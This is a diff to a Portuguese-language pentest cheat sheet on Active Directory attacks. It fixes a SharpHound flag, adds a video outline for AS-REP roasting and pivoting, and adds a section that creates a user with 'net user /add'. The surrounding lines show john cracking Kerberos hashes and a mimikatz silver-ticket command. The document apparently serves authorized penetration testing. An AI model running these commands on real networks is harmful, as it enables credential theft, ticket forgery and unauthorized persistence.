@@ -14,6 +14,7 @@ Aqui já podemos levar em conta que já temos uma credencial válida de domínio
 - [ ] [**Pass the Hash**](#pass-the-hash)
 - [ ] [**Over Pass the Hash**](#over-pass-the-hash)
 - [ ] [**Silver Ticket**](#silver-ticket)
+- [ ] [**Adicionar usuário privilegiado**](#adicionar-usuario-privilegiado)
 
 
 ## Enumeração do domínio com Bloodhound
@@ -26,7 +27,7 @@ bloodhound-python -u <usuario> -p <senha> -d <dominio.local> -v --zip -c All -dc
 
 Opção local com SharpHound, sendo SharpHound.exe = sh.exe
 ```
-    ./sh.exe -c all -d dominio.local --ldapuser <usuario> --ldappassword <senha>
+    ./sh.exe -c all -d dominio.local --ldapusername <usuario> --ldappassword <senha>
 ```
 Vale ressaltar que existe a possibilidade de executar esse comando de outras formas também e a maneira mais simples de fazâ-lo seria:
 
@@ -116,6 +117,23 @@ ou com Rubeus
 Depois, para quebrar o(s) hash(s):
 
     john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
+
+### Referência em vídeo
+
+![type:video](https://youtube.com/embed/xNGfCADe9tk)
+
+0:00 Introdução
+0:30 Configuração necessária para explorar a vulnerabilidade
+1:30 Configuração do ambiente de teste
+3:45 Obtendo nome de domínio, hostname e ip do controlador de domínio
+5:20 Explorando com Rubeus no Windows
+6:10 Adequando o output da ferramenta
+7:00 Quebrando o hash de senha com john
+10:00 Utilizando o host comprometido como pivot para os demais hosts da rede
+11:25 Configurando o Proxychains
+14:25 Explorando com Impacket no Linux
+
+
 
 ## Password spray
 
@@ -365,3 +383,7 @@ Esse tipo de ataque é interessante para fazer lateralização, dado que vários
 
     ./m.exe
     kerberos::golden /user:<usuario> /domain:corp.com /sid:<sid_do_dominio> /target:<dominio.local> /service:HTTP /rc4:<nthash> /ptt
+
+## Adicionar usuário privilegiado
+
+    net user <usuario> <senha> /add
